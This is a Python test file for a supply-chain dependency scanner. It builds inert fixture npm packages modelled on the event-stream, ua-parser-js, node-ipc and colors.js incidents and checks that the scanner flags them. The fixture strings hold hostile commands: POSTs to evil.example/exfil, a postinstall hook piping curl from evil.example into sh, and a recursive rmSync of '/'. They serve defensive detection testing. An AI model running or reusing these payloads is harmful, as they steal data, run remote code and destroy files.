"""Reconstructed supply-chain-incident fixtures, run end to end.

Each test builds two on-disk trees shaped exactly like what `fetch_source()`
returns for a real fetch (a wrapper directory — npm's `package/`, GitHub's
`{repo}-{ref}/` — plus a sibling `.complete` marker), runs the *real* Semgrep
scanner against both, then feeds the resulting profiles through
`compute_delta` and `compare_sources`. These are the payloads the review
flagged as missing: the three real bugs it found (drift never collapsing the
wrapper, install-hook lookup missing the wrapper, and the sourcemap `lstrip`
bug) are exactly what fixtures shaped this way would have caught, since the
earlier versions built their test directories without the `.complete`
marker.

The payloads below are inert reconstructions of publicly documented
incidents (event-stream, ua-parser-js, node-ipc, colors.js) — labelled data
for the scanner to classify, never executed.
"""

import json
from pathlib import Path

import pytest

from backend.deps import scanner
from backend.deps.delta import compute_delta
from backend.deps.drift import compare_sources
from backend.models.dependencies import ResolvedPackage
from backend.models.enums import SourceKind


pytestmark = pytest.mark.skipif(
    scanner.resolve_semgrep_binary() is None, reason="semgrep binary not installed"
)


def _fetched(tmp_path: Path, label: str, wrapper: str) -> tuple[Path, Path]:
    """A fetch_source()-shaped directory: wrapper/ + a sibling .complete marker."""
    fetch_dir = tmp_path / label
    content_dir = fetch_dir / wrapper
    content_dir.mkdir(parents=True)
    (fetch_dir / ".complete").touch()
    return fetch_dir, content_dir


def _write(content_dir: Path, rel_path: str, text: str) -> None:
    path = content_dir / rel_path
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)


def _pkg(name, version, publisher, published_at=None):
    return ResolvedPackage(
        name=name,
        version=version,
        tarball_url=f"https://registry.npmjs.org/{name}.tgz",
        integrity="sha512-AAAA",
        publisher=publisher,
        published_at=published_at,
    )


async def _scan(content_dir_parent: Path, name: str, version: str, kind=SourceKind.NPM_TARBALL):
    profile = await scanner.scan_source(content_dir_parent, kind, name=name, version=version)
    assert profile.status == "ok", f"scan did not complete cleanly: {profile.status}"
    return profile


@pytest.mark.asyncio
async def test_event_stream_style_incident_flags_and_drifts(tmp_path):
    """A small patch release, from a new publisher, adds a dynamically-loaded
    module reaching the network — present in the tarball but absent from the
    package's actual GitHub source."""
    prev_dir, prev_content = _fetched(tmp_path, "prev", "package")
    _write(prev_content, "package.json", json.dumps({"name": "evt-pkg", "version": "3.3.4"}))
    _write(prev_content, "index.js", "module.exports = function () { return true; };")

    curr_dir, curr_content = _fetched(tmp_path, "curr", "package")
    _write(curr_content, "package.json", json.dumps({"name": "evt-pkg", "version": "3.3.5"}))
    _write(curr_content, "index.js", "module.exports = function () { return true; };")
    _write(
        curr_content,
        "payload.js",
        "var mod = process.env.SOME_FLAG ? './a' : './b';\n"
        "require(mod)(process.env);\n"
        "fetch('https://evil.example/exfil', {method: 'POST'});\n",
    )

    github_dir, github_content = _fetched(tmp_path, "github", "evt-pkg-abc123")
    _write(github_content, "package.json", json.dumps({"name": "evt-pkg", "version": "3.3.5"}))
    _write(github_content, "index.js", "module.exports = function () { return true; };")

    prev_profile = await _scan(prev_dir, "evt-pkg", "3.3.4")
    curr_profile = await _scan(curr_dir, "evt-pkg", "3.3.5")
    github_profile = await _scan(github_dir, "evt-pkg", "3.3.5", kind=SourceKind.GITHUB)

    delta = compute_delta(
        _pkg("evt-pkg", "3.3.4", publisher="original-maintainer"),
        _pkg("evt-pkg", "3.3.5", publisher="new-account"),
        prev_profile,
        curr_profile,
    )
    assert "suspicious_capability_addition" in delta.flags

    drift = compare_sources("evt-pkg", "3.3.5", curr_dir, curr_profile, github_dir, github_profile)
    assert drift.status == "compared"
    assert "payload.js" in drift.unexplained
    assert drift.signal is True


@pytest.mark.asyncio
async def test_ua_parser_js_style_postinstall_flags_and_drifts(tmp_path):
    """A postinstall hook that runs a bundled script (download + execute) —
    the classic supply-chain persistence shape."""
    prev_dir, prev_content = _fetched(tmp_path, "prev", "package")
    _write(prev_content, "package.json", json.dumps({"name": "ua-pkg", "version": "0.7.28"}))
    _write(prev_content, "index.js", "module.exports = {};")

    curr_dir, curr_content = _fetched(tmp_path, "curr", "package")
    _write(
        curr_content,
        "package.json",
        json.dumps(
            {
                "name": "ua-pkg",
                "version": "0.7.29",
                "scripts": {"postinstall": "node scripts/setup.js"},
            }
        ),
    )
    _write(curr_content, "index.js", "module.exports = {};")
    _write(
        curr_content,
        "scripts/setup.js",
        "require('child_process').exec('curl -s https://evil.example/x.sh | sh');\n",
    )

    github_dir, github_content = _fetched(tmp_path, "github", "ua-pkg-abc123")
    _write(github_content, "package.json", json.dumps({"name": "ua-pkg", "version": "0.7.29"}))
    _write(github_content, "index.js", "module.exports = {};")

    prev_profile = await _scan(prev_dir, "ua-pkg", "0.7.28")
    curr_profile = await _scan(curr_dir, "ua-pkg", "0.7.29")
    github_profile = await _scan(github_dir, "ua-pkg", "0.7.29", kind=SourceKind.GITHUB)

    delta = compute_delta(
        _pkg("ua-pkg", "0.7.28", publisher="original-maintainer"),
        _pkg("ua-pkg", "0.7.29", publisher="new-account"),
        prev_profile,
        curr_profile,
    )
    assert "install_hook_added" in delta.flags
    assert "suspicious_capability_addition" in delta.flags  # process + network both risky

    drift = compare_sources("ua-pkg", "0.7.29", curr_dir, curr_profile, github_dir, github_profile)
    assert "scripts/setup.js" in drift.unexplained
    assert drift.signal is True


@pytest.mark.asyncio
async def test_node_ipc_style_geo_gated_filesystem_sabotage(tmp_path):
    """A minor release, from a new publisher, adds a network call that gates a
    filesystem write/delete — network is the risky category that trips the flag."""
    prev_dir, prev_content = _fetched(tmp_path, "prev", "package")
    _write(prev_content, "package.json", json.dumps({"name": "ipc-pkg", "version": "9.1.0"}))
    _write(prev_content, "index.js", "module.exports = {};")

    curr_dir, curr_content = _fetched(tmp_path, "curr", "package")
    _write(curr_content, "package.json", json.dumps({"name": "ipc-pkg", "version": "9.2.0"}))
    _write(
        curr_content,
        "index.js",
        "fetch('https://geo.example/lookup').then(function (r) {\n"
        "  require('fs').rmSync('/', {recursive: true});\n"
        "});\n",
    )

    prev_profile = await _scan(prev_dir, "ipc-pkg", "9.1.0")
    curr_profile = await _scan(curr_dir, "ipc-pkg", "9.2.0")

    delta = compute_delta(
        _pkg("ipc-pkg", "9.1.0", publisher="original-maintainer"),
        _pkg("ipc-pkg", "9.2.0", publisher="new-account"),
        prev_profile,
        curr_profile,
    )
    assert "suspicious_capability_addition" in delta.flags


@pytest.mark.asyncio
async def test_colors_js_style_sabotage_with_no_new_capability_is_not_flagged(tmp_path):
    """Negative control documenting the engine's limits: a sabotage payload
    that adds no new *capability category* (an infinite loop / garbage
    output) produces no flag, even with a publisher change."""
    prev_dir, prev_content = _fetched(tmp_path, "prev", "package")
    _write(prev_content, "package.json", json.dumps({"name": "colors-pkg", "version": "1.4.0"}))
    _write(prev_content, "index.js", "module.exports = function (s) { return s; };")

    curr_dir, curr_content = _fetched(tmp_path, "curr", "package")
    _write(curr_content, "package.json", json.dumps({"name": "colors-pkg", "version": "1.4.1"}))
    _write(
        curr_content,
        "index.js",
        "module.exports = function (s) { while (true) { console.log('LIBERTY LIBERTY'); } };",
    )

    prev_profile = await _scan(prev_dir, "colors-pkg", "1.4.0")
    curr_profile = await _scan(curr_dir, "colors-pkg", "1.4.1")

    delta = compute_delta(
        _pkg("colors-pkg", "1.4.0", publisher="original-maintainer"),
        _pkg("colors-pkg", "1.4.1", publisher="original-maintainer"),
        prev_profile,
        curr_profile,
    )
    assert delta.flags == []
    assert delta.categories_added == []


@pytest.mark.asyncio
async def test_benign_refactor_produces_no_delta(tmp_path):
    """Negative control: an ordinary refactor with identical capabilities and
    publisher produces an empty delta."""
    prev_dir, prev_content = _fetched(tmp_path, "prev", "package")
    _write(prev_content, "package.json", json.dumps({"name": "refactor-pkg", "version": "2.0.0"}))
    _write(prev_content, "index.js", "require('fs').writeFileSync('/tmp/x', 'a');")

    curr_dir, curr_content = _fetched(tmp_path, "curr", "package")
    _write(curr_content, "package.json", json.dumps({"name": "refactor-pkg", "version": "2.0.1"}))
    _write(
        curr_content,
        "index.js",
        "function write() { require('fs').writeFileSync('/tmp/x', 'a'); }\nwrite();",
    )

    prev_profile = await _scan(prev_dir, "refactor-pkg", "2.0.0")
    curr_profile = await _scan(curr_dir, "refactor-pkg", "2.0.1")

    delta = compute_delta(
        _pkg("refactor-pkg", "2.0.0", publisher="maintainer"),
        _pkg("refactor-pkg", "2.0.1", publisher="maintainer"),
        prev_profile,
        curr_profile,
    )
    assert delta.categories_added == []
    assert delta.categories_removed == []
    assert delta.flags == []


@pytest.mark.asyncio
async def test_payload_hidden_in_test_dir_but_required_from_index_is_promoted(tmp_path):
    """A payload sitting in test/ would ordinarily be excluded from
    category_set() by path_class alone — but index.js require()'s it, so the
    reachability pass in backend.deps.references must promote it to SHIPPED
    and its network capability must show up in the profile."""
    curr_dir, curr_content = _fetched(tmp_path, "curr", "package")
    _write(curr_content, "package.json", json.dumps({"name": "reach-pkg", "version": "1.0.0"}))
    _write(curr_content, "index.js", "require('./test/payload');\nmodule.exports = {};\n")
    _write(
        curr_content,
        "test/payload.js",
        "fetch('https://evil.example/exfil', {method: 'POST'});\nmodule.exports = {};\n",
    )

    profile = await _scan(curr_dir, "reach-pkg", "1.0.0")

    from backend.models.enums import CapabilityCategory, PathClass

    assert CapabilityCategory.NETWORK in profile.category_set()
    payload_evidence = [
        e for e in profile.evidence if e.file.replace("\\", "/").endswith("test/payload.js")
    ]
    assert payload_evidence, "expected evidence from test/payload.js"
    assert all(e.path_class == PathClass.SHIPPED for e in payload_evidence)
    assert all(e.reclassified_from == PathClass.TEST for e in payload_evidence)


@pytest.mark.asyncio
async def test_install_hook_target_under_test_dir_is_forced_shipped(tmp_path):
    """A postinstall hook that runs a file sitting under test/ must still
    have that file's evidence counted — path-classified TEST would otherwise
    hide it from category_set() even though it demonstrably executes on
    `npm install`."""
    curr_dir, curr_content = _fetched(tmp_path, "curr", "package")
    _write(
        curr_content,
        "package.json",
        json.dumps(
            {
                "name": "hook-pkg",
                "version": "1.0.0",
                "scripts": {"postinstall": "node test/install.js"},
            }
        ),
    )
    _write(curr_content, "index.js", "module.exports = {};")
    _write(
        curr_content,
        "test/install.js",
        "fetch('https://evil.example/exfil', {method: 'POST'});\n",
    )

    profile = await _scan(curr_dir, "hook-pkg", "1.0.0")

    from backend.models.enums import CapabilityCategory, PathClass

    assert CapabilityCategory.NETWORK in profile.category_set()
    hook_evidence = [
        e for e in profile.evidence if e.file.replace("\\", "/").endswith("test/install.js")
    ]
    assert hook_evidence
    assert all(e.path_class == PathClass.SHIPPED for e in hook_evidence)
    assert all(e.install_time for e in hook_evidence)
    assert all(e.reclassified_from == PathClass.TEST for e in hook_evidence)


@pytest.mark.asyncio
async def test_benign_ts_build_produces_no_drift_signal(tmp_path):
    """Negative control: the tarball is nothing but compiled dist/ output with
    a proper source map back to the GitHub source — zero drift signal."""
    tarball_dir, tarball_content = _fetched(tmp_path, "tarball", "package")
    _write(
        tarball_content,
        "package.json",
        json.dumps({"name": "ts-pkg", "version": "1.0.0", "main": "dist/index.js"}),
    )
    _write(
        tarball_content,
        "dist/index.js",
        "\"use strict\";\nfunction f(){return require('fs').readFileSync('x');}\n//# sourceMappingURL=index.js.map",
    )
    _write(
        tarball_content,
        "dist/index.js.map",
        json.dumps({"sources": ["../src/index.ts"]}),
    )

    github_dir, github_content = _fetched(tmp_path, "github", "ts-pkg-abc123")
    _write(github_content, "package.json", json.dumps({"name": "ts-pkg", "version": "1.0.0"}))
    _write(
        github_content,
        "src/index.ts",
        "export function f(): string { return require('fs').readFileSync('x'); }",
    )

    tarball_profile = await _scan(tarball_dir, "ts-pkg", "1.0.0")
    github_profile = await _scan(github_dir, "ts-pkg", "1.0.0", kind=SourceKind.GITHUB)

    drift = compare_sources(
        "ts-pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert drift.status == "compared"
    assert drift.signal is False
    assert drift.unexplained == [] or all(f not in drift.unexplained for f in ("dist/index.js",))
